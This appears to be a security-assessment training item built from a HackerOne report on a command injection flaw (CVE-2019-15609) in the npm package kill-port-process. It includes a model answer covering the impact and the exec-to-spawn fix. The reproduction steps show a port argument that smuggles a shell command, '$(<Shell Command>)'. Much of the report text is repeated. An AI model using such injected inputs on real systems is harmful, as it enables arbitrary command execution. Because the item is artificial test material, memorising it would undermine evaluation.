# CMDI — h1

- source: h1
- class: cmdi
- cwe: CWE-77
- cve: ['CVE-2019-15609']
- severity: medium
- program: nodejs-ecosystem
- quality_score: 12

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** Command Injection vulnerability in kill-port-process package
**Affected Asset:** kill-port-process

**Vulnerability Description:**
I would like to report a command injection vulnerability in the kill-port-process package. It allows an attacker to inject arbitrary commands.

# Module

**module name:**  kill-port-process
**version:** 1.1.0
**npm page:** `https://www.npmjs.com/package/kill-port-process`

## Module Stats

0 downloads in the last day
138 downloads in the last week
660 downloads in the last month

# Vulnerability

## Vulnerability Description

The attacker can control the port number. Then He/She can insert a shell command instead of a port number. The root user is the only user execute kill command on the OS, thus root will execute an arbitrary command.

## Steps To Reproduce:

**Installing the module:** `npm install kill-port-process -E`

**Following the example in the npm page:**
```javascript
const killPortProcess = require('kill-port-process');
const PORT = "$(<Shell Command>)";
await killPortProcess(PORT);
```
**CLI mode:** 
```shell
kill-port "$(<Shell Command>)"
```

## Patch

**In the file src/lib/killer.ts:**
Replace: `import { exec } from 'child_process'`
To: `import { spawn } from 'child_process'`

## Supporting Material/References:
- Arch Linux 5.2.1 x64
- NODEJS 11.15.0
- NPM 6.10.2

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An attacker can execute arbitrary commands on the victim's machine.

**Steps to Reproduce:**
**Installing the module:** `npm install kill-port-process -E`

**Following the example in the npm page:**
```javascript
const killPortProcess = require('kill-port-process');
const PORT = "$(<Shell Command>)";
await killPortProcess(PORT);
```
**CLI mode:** 
```shell
kill-port "$(<Shell Command>)"
```

## Patch

**In the file src/lib/killer.ts:**
Replace: `import { exec } from 'child_process'`
To: `import { spawn } from 'child_process'`

## Supporting Material/References:
- Arch Linux 5.2.1 x64
- NODEJS 11.15.0
- NPM 6.10.2

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

**Proof of Concept:**
```javascript
const killPortProcess = require('kill-port-process');
const PORT = "$(<Shell Command>)";
await killPortProcess(PORT);
```

```shell
kill-port "$(<Shell Command>)"
```

## Analysis / Response

**Vulnerability Class:** cmdi
**CWE:** CWE-77
**Weakness:** Command Injection - Generic
**Severity:** medium
**Endpoint Pattern:** https://www.npmjs.com/package/kill-port-process

**Impact Assessment:**
An attacker can execute arbitrary commands on the victim's machine.

**Remediation:**
Avoid passing user input to system commands. Use language-native APIs instead of shell execution. If unavoidable, use strict allowlists for permitted values.
